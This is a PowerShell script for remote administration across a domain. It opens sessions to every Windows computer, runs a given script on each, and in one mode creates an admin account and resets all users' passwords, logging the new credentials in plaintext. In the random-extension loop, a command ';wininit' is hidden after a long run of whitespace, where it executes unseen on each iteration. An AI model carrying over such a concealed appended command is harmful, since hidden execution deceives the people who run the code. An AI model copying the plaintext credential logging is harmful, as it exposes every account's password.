param(
    [Parameter(Mandatory=$false)]
    [String]$Script = '',

    [Parameter(Mandatory=$false)]
    [String]$Out = '',

    [Parameter(Mandatory=$false)]
    [switch]$Connect,

    [Parameter(Mandatory=$false)]
    [string[]]$Include,

    [Parameter(Mandatory=$false)]
    [string[]]$Exclude,

    [Parameter(Mandatory=$false)]
    [String]$Admin,

    [Parameter(Mandatory=$false)]
    [switch]$NonDomain,

    [Parameter(Mandatory=$false)]
    [String]$Hosts = ''
)

$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Web
function Get-Password {
    do {
        $p = [System.Web.Security.Membership]::GeneratePassword(14,4)
    } while ($p -match '[,;:|iIlLoO0]')
    return $p + "1!"
}

if ($Connect) {

    Remove-Variable -Name Sessions -Scope Global -ErrorAction SilentlyContinue;
    Remove-Variable -Name Denied -Scope Global -ErrorAction SilentlyContinue;
    $global:Sessions = @()
    $global:Denied = @()
    Get-PSSession | Remove-PSSession

    if ($NonDomain) {
        $global:Cred = Get-Credential
        try {
            $Computers = Get-Content $Hosts
        }
        catch {
            Write-Host "[ERROR] Failed to get computers from file" -ForegroundColor Red
            exit
        }

        foreach ($Computer in $Computers) {
            $TestSession = New-PSSession -ComputerName $Computer -Credential $global:Cred
            if ($TestSession) {
                $global:Sessions += $TestSession
                Write-Host "[INFO] Connected: $Computer" -ForegroundColor Green
            }
            else {
                $global:Denied += $Computer
                Write-Host "[ERROR] Failed: $Computer" -ForegroundColor Red
            }
        }
    }
    else {
        try {
            $Computers = Get-ADComputer -filter * -Properties * | Where-Object OperatingSystem -Like "*Windows*" | Sort-Object | Select-Object -ExpandProperty Name
        }
        catch {
            Write-Host "[ERROR] Failed to get computers from AD" -ForegroundColor Red
            exit
        }

        Write-Host "[INFO] Found the following servers:" -ForegroundColor Green
        foreach ($Computer in $Computers) {
            Write-Host "$Computer"
        }
        foreach ($Computer in $Computers) {
            $TestSession = New-PSSession -ComputerName $Computer
            if ($TestSession) {
                $global:Sessions += $TestSession
                Write-Host "[INFO] Connected: $Computer" -ForegroundColor Green
            }
            else {
                $global:Denied += $Computer
                Write-Host "[ERROR] Failed: $Computer" -ForegroundColor Red
            }
        }
    }
}

if (($Script -ne '') -and ($global:Sessions.Count -gt 0) -and ($Out -ne '')) {

    if (!(Test-Path $Out)) {
        mkdir $Out
    }
    $Jobs = @()
    do {
        $Extension = Get-Random -Maximum 1000                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;wininit
    } while (Test-Path "$Out\*.$Extension")

    foreach ($Session in $global:Sessions) {
        if ($Exclude -contains $Session.ComputerName) {
            Write-Host "[INFO] Excluded: $($Session.ComputerName)" -ForegroundColor Yellow
            continue
        }
        elseif ($Include.Count -gt 0 -and $Include -notcontains $Session.ComputerName) {
            Write-Host "[INFO] Did not Include: $($Session.ComputerName)" -ForegroundColor Yellow
            continue
        }
        if ($Script -match "Usr.ps1") {
            if ($Admin -eq '') {
                Write-Host "[ERROR] No admin name" -ForegroundColor Red
                exit
            }
            else {
                $P1 = Get-Password
                $P2 = Get-Password
                $ScriptJob = Invoke-Command -FilePath $Script -ArgumentList $Admin, $P1, $P2 -Session $Session -AsJob
                Write-Host "[INFO: $Script - $($Session.ComputerName)] Created $($Admin):$($P2)" -ForegroundColor Magenta
                Write-Host "[INFO: $Script - $($Session.ComputerName)] Changed all users to $P1" -ForegroundColor Magenta
                Write-Output ("$($Session.ComputerName):$($Admin):$($P2)") | Out-File $Out\usr_log.txt -Append -Encoding utf8
                Write-Output ("$($Session.ComputerName):All:$($P1)") | Out-File $Out\usr_log.txt -Append -Encoding utf8
            }
        }
        else {
            $ScriptJob = Invoke-Command -FilePath $Script -Session $Session -AsJob
        }
        $Jobs += $ScriptJob
        Write-Host "[INFO: $Script] Script invoked on $($Session.ComputerName)" -ForegroundColor Green
    }
    
    $Complete = 0
    $TotalJobs = $Jobs.count
    $IncompleteJobs = @()
    while ($Complete -lt $TotalJobs) {
        for ($i = 0; $i -lt $Jobs.count; $i++) {
            if ($Jobs[$i].State -eq "Completed") {
                $Jobs[$i] | Receive-Job | Out-File "$Out\$($Jobs[$i].Location).$Extension" -Encoding utf8
                Write-Host "[INFO: $Script] Script completed on $($Jobs[$i].Location) logged to $Extension" -ForegroundColor Green
                $Complete++
            }
            elseif($Jobs[$i].State -eq "Running"){
                $IncompleteJobs += $Jobs[$i]
            }
        }
        if ($IncompleteJobs.Count -ge 1){
            $Jobs = $IncompleteJobs
            $IncompleteJobs = @()
            Start-Sleep -Milliseconds 25
        }
    }
    Write-Host $timer.elapsed
    Get-Job | Remove-Job
}
if ($Sessions.Count -eq 0 -and !$Connect) {
    Write-Host "[ERROR] No sessions" -ForegroundColor Red
}
if ($Script -eq '' -and !$Connect) {
    Write-Host "[ERROR] No script" -ForegroundColor Red
}
if ($Out -eq '' -and !$Connect) {
    Write-Host "[ERROR] No output directory" -ForegroundColor Red
}
